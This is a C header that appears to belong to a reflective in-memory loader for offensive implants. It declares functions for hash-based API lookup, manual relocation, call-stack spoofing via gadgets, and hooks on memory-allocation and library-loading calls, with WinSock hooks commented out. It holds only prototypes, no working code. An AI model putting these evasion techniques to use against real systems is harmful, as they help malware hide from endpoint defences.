#include <winsock.h>
#include <winsock2.h>
#include <Structs.h>

PVOID   GetRIP( VOID );
PVOID   Start();
PVOID   End();
PVOID   KaynCaller();
PVOID   Fixup();
PVOID   Spoof(PVOID a, ...);
VOID    KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID Dir );
PVOID   CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length);
PVOID   LdrModulePeb ( PVOID hModuleHash );
PVOID   LdrFunctionAddr( UINT_PTR Module, UINT_PTR FunctionHash );
PVOID   HashString( PVOID String, UINT_PTR Length);
SIZE_T KStringLengthA( LPCSTR String );
SIZE_T KStringLengthW(LPCWSTR String);
SIZE_T KCharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed );
PVOID KLoadLibrary(LdrLoadDll_t pLdrLoadDll, LPSTR ModuleName, PPRM p );
ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase);
ULONG CalculateFunctionStackSizeWrapper(PVOID ReturnAddress);
PVOID FindGadget(LPBYTE Module, ULONG Size);
VOID PrepSpoof(PPRM Param);
PVOID WINAPI RtlSecureZeroMemory(PVOID ptr,SIZE_T cnt);


//Hooks
PVOID VirtualAllocHook(LPVOID lpAddress, SIZE_T dwSize, DWORD allocType, DWORD protType);
PVOID LoadLibraryAHook(LPCSTR LibraryName);
PVOID GetProcAddressHook(PVOID HModule, LPCSTR Export);
PVOID VirtualAllocExHook(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD allocType, DWORD protType);
PVOID VirtualProtectHook(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
PVOID VirtualProtectExHook(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

//WS2_32.DLL
// PVOID ntohlHook( u_long netlong );
// PVOID htonlHook( u_long hostlong );
// PVOID freeaddrinfoHook( PADDRINFOA pAddrInfo );
// PVOID getaddrinfoHook( PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult );
// PVOID WSADuplicateSocketAHook( SOCKET s, DWORD dwProcessId, LPWSAPROTOCOL_INFOA lpProtocolInfo );
// PVOID WSAGetLastErrorHook( );
// PVOID WSAStartupHook( WORD wVersionRequired, LPWSADATA lpWSAData );
// PVOID gethostbynameHook( const char *name );
// PVOID socketHook( int af, int type, int protocol );
// PVOID setsockoptHook( SOCKET s, int level, int optname, const char *optval, int optlen);
// PVOID sendHook( SOCKET s, const char *buf, int len, int flags );
// PVOID selectHook( int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const timeval *timeout );
// PVOID recvHook( SOCKET s, char *buf, int len, int flags );
// PVOID listenHook( SOCKET s, int backlog );
// PVOID inet_ntoaHook( in_addr* in );
// PVOID inet_addrHook( const char *cp );
// PVOID connectHook( SOCKET s, const sockaddr *name, int namelen );
// PVOID closesocketHook( SOCKET s );
// PVOID bindHook( SOCKET s, const sockaddr *name, int  namelen );
// PVOID acceptHook( SOCKET s, sockaddr *addr, int *addrlen );
// PVOID htonsHook( u_short hostshort );
